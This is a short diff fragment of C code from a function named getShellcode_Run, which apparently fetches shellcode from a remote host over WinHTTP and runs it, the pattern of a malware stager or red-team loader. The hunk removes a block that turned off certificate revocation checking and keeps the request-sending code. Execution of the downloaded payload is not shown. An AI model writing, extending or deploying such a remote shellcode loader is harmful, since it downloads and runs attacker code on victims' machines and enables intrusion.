@@ -376,15 +376,6 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    // Disable certificate revocation checking
-    disableFeature = WINHTTP_DISABLE_CERTIFICATE_REVOCATION_CHECK;
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_DISABLE_FEATURE, &disableFeature, sizeof(disableFeature))) {
-        char msg[256];
-        sprintf_s(msg, "WinHttpSetOption (disable revocation) failed with error: %ld\n", GetLastError());
-        OutputDebugStringA(msg);
-        goto cleanup;
-    }
-
     // Send the request
     bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (!bResults) {
